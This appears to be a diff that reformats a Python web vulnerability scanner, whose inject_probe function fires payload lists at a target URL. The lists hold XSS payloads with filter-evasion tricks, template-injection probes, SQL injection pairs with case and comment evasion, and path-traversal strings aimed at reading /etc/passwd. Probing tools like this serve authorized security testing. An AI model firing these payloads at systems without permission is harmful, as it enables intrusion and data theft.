@@ -35,25 +35,31 @@ _XSS_WEAPONS = [
     "<video onerror={a}()><source src=x>",
     "<body onload={a}()>",
     "<details open ontoggle={a}()>",
-    "<img/src=x/onerror={a}()>",           # slash-separated: survives whitespace stripping
+    "<img/src=x/onerror={a}()>",  # slash-separated: survives whitespace stripping
     "<svg/onload={a}()>",
     "<math/onload={a}()>",
-    "\u003cscript\u003e{a}()",               # unicode-escaped tag open
-    "<img src=x onerror=\\u0061lert(1)>",   # unicode call
+    "\u003cscript\u003e{a}()",  # unicode-escaped tag open
+    "<img src=x onerror=\\u0061lert(1)>",  # unicode call
     "<img src=x onerror=top['al'+'ert'](-1)>",  # property concat
-    "<img src=x onerror=({a})()>",           # paren-wrapped call
-    '" onmouseover={a}() x="',               # attribute stay-in (double-quoted ctx)
+    "<img src=x onerror=({a})()>",  # paren-wrapped call
+    '" onmouseover={a}() x="',  # attribute stay-in (double-quoted ctx)
     "' onmouseover={a}() x='",
-    "javascript:{a}()",                       # URI context
-    "<a href=\"javascript:{a}()\">x</a>",
-    "<img src=x onerror={a}&#40;1&#41;>",    # HTML-entity parens
-    "<img src=x onerror={a}`x`>",             # backtick arg (BAREARG)
-    "<img src=x onerror=/.//.source/{a}>",   # regex-source arg
+    "javascript:{a}()",  # URI context
+    '<a href="javascript:{a}()">x</a>',
+    "<img src=x onerror={a}&#40;1&#41;>",  # HTML-entity parens
+    "<img src=x onerror={a}`x`>",  # backtick arg (BAREARG)
+    "<img src=x onerror=/.//.source/{a}>",  # regex-source arg
 ]
 _SSTI_SYNTAXES = [
-    "{{7919*6841}}", "{% set x = 7919*6841 %}{{x}}", "${7919*6841}",
-    "#{7919*6841}", "<%= 7919*6841 %>", "{{ 7919*6841 }}", "[[7919*6841]]",
-    "{{7919*6841|add:0}}", "{(7919*6841)}",
+    "{{7919*6841}}",
+    "{% set x = 7919*6841 %}{{x}}",
+    "${7919*6841}",
+    "#{7919*6841}",
+    "<%= 7919*6841 %>",
+    "{{ 7919*6841 }}",
+    "[[7919*6841]]",
+    "{{7919*6841|add:0}}",
+    "{(7919*6841)}",
 ]
 _SSTI_PRODUCT = str(7919 * 6841)  # 54172279 — negligible coincidence
 _SSTI_LITERALS = ("{{", "}}", "${", "#{", "<%=", "[[", "{%")
@@ -67,16 +73,28 @@ _SQLI_ERRORS = [
     ("odbc", "OLE DB"),
 ]
 _SQLI_BOOL_PAIRS = [
-    ("' AND '1'='1", "' AND '1'='2"),        # AND narrows — safe pair
+    ("' AND '1'='1", "' AND '1'='2"),  # AND narrows — safe pair
     ("'/**/AND/**/'1'='1", "'/**/AND/**/'1'='2"),  # comment-separated
-    ("'AnD'1'='1", "'AnD'1'='2"),            # case evasion
-    ("'or(1)#", "'or(0)#"),                   # spaceless
+    ("'AnD'1'='1", "'AnD'1'='2"),  # case evasion
+    ("'or(1)#", "'or(0)#"),  # spaceless
 ]
 _LFI_SHAPES = [
-    "../", "..\\", "..%2f", "..%5c", "%2e%2e%2f", "..%252f", "....//", "....\\/",
-    "..;/", "..%00", "%252e%252e%252f",
+    "../",
+    "..\\",
+    "..%2f",
+    "..%5c",
+    "%2e%2e%2f",
+    "..%252f",
+    "....//",
+    "....\\/",
+    "..;/",
+    "..%00",
+    "%252e%252e%252f",
 ]
-_LFI_TARGETS = [("/etc/passwd", re.compile(r"root:[^:]*:0:0:")), ("/etc/hosts", re.compile(r"127\.0\.0\.1\s+localhost"))]
+_LFI_TARGETS = [
+    ("/etc/passwd", re.compile(r"root:[^:]*:0:0:")),
+    ("/etc/hosts", re.compile(r"127\.0\.0\.1\s+localhost")),
+]
 
 _WAF_RX = re.compile(r"cloudflare|cf-ray|sucuri|akamai|mod_security|403 forbidden|challenge-platform", re.I)
 
@@ -132,8 +150,13 @@ def inject_probe(
             if base is None:
                 return f"Error: request_id '{request_id}' not found"
         else:
-            base = {"method": str(method).upper(), "url": str(url), "headers": dict(headers or {}),
-                    "body": str(body or ""), "cookies": ""}
+            base = {
+                "method": str(method).upper(),
+                "url": str(url),
+                "headers": dict(headers or {}),
+                "body": str(body or ""),
+                "cookies": "",
+            }
         if not base.get("url"):
             return "Error: url (or request_id) required"
         if not allow_internal:
@@ -167,7 +190,12 @@ def inject_probe(
             body_txt = res.get("body") or ""
             reflected = marker in body_txt
             facts["marker_reflected"] = reflected
-            facts["marker_html_encoded"] = (marker not in body_txt) and (f"z&#88;{nonce}" in body_txt or f"zx{nonce}" != marker and marker.lower() in body_txt.lower() and marker not in body_txt)
+            facts["marker_html_encoded"] = (marker not in body_txt) and (
+                f"z&#88;{nonce}" in body_txt
+                or f"zx{nonce}" != marker
+                and marker.lower() in body_txt.lower()
+                and marker not in body_txt
+            )
             if reflected:
                 facts["context"] = _classify_context(body_txt, marker)
                 # 3) weaponized battery (ordered alert-first)
@@ -187,7 +215,9 @@ def inject_probe(
                     break
                 res = _fire(syntax)
                 body_txt = res.get("body") or ""
-                if _SSTI_PRODUCT in body_txt and not any(lit in body_txt.split(_SSTI_PRODUCT)[0][-40:] for lit in _SSTI_LITERALS):
+                if _SSTI_PRODUCT in body_txt and not any(
+                    lit in body_txt.split(_SSTI_PRODUCT)[0][-40:] for lit in _SSTI_LITERALS
+                ):
                     hits.append(syntax)  # product present, literal absent = EVALUATED (not reflected)
             facts["evaluated_syntaxes"] = hits
             facts["note"] = "product-present + literal-absent = evaluated; literal echo = reflection only"
@@ -203,7 +233,7 @@ def inject_probe(
             facts["command_output"] = outputs
         elif cls == "sqli":
             errors = []
-            for payload in ["'", "\"", "'\"", "1'", "' -- ", "1)"]:
+            for payload in ["'", '"', "'\"", "1'", "' -- ", "1)"]:
                 if len(sends) >= _MAX_SENDS:
                     break
                 res = _fire(payload)
@@ -214,7 +244,7 @@ def inject_probe(
             # boolean differentials vs a MEASURED noise floor
             noise = []
             for _ in range(2):
-                n = _fire(f"z{ _nonce() }")
+                n = _fire(f"z{_nonce()}")
                 noise.append(n.get("length") or 0)
             floor = max(16, (max(noise) - min(noise)) + 8) if noise else 16
             facts["noise_floor_bytes"] = floor
@@ -227,8 +257,17 @@ def inject_probe(
                 delta = abs((rt.get("length") or 0) - (rf.get("length") or 0))
                 tms = abs((rt.get("ms") or 0) - (rf.get("ms") or 0))
                 if delta > floor or tms >= 200:
-                    bools.append({"true": t, "false": f, "delta_bytes": delta, "delta_ms": tms,
-                                  "signals": ([s for s in ("length", "timing") if (delta > floor if s == "length" else tms >= 200)])})
+                    bools.append(
+                        {
+                            "true": t,
+                            "false": f,
+                            "delta_bytes": delta,
+                            "delta_ms": tms,
+                            "signals": (
+                                [s for s in ("length", "timing") if (delta > floor if s == "length" else tms >= 200)]
+                            ),
+                        }
+                    )
             facts["bool_findings"] = bools
         elif cls == "lfi":
             reads = []
@@ -252,7 +291,16 @@ def inject_probe(
         blocks = sum(1 for s in statuses if s in (403, 406, 429, 503))
         facts["block_signals"] = blocks
         if blocks > len(sends) * 0.6 and not any(
-            facts.get(k) for k in ("surviving_tags", "evaluated_syntaxes", "command_output", "error_findings", "file_reads", "bool_findings", "weaponized_reflected")
+            facts.get(k)
+            for k in (
+                "surviving_tags",
+                "evaluated_syntaxes",
+                "command_output",
+                "error_findings",
+                "file_reads",
+                "bool_findings",
+                "weaponized_reflected",
+            )
         ):
             facts["block_verdict"] = (
                 "payloads were WAF/challenge-BLOCKED — this is NOT evidence the endpoint is safe. "
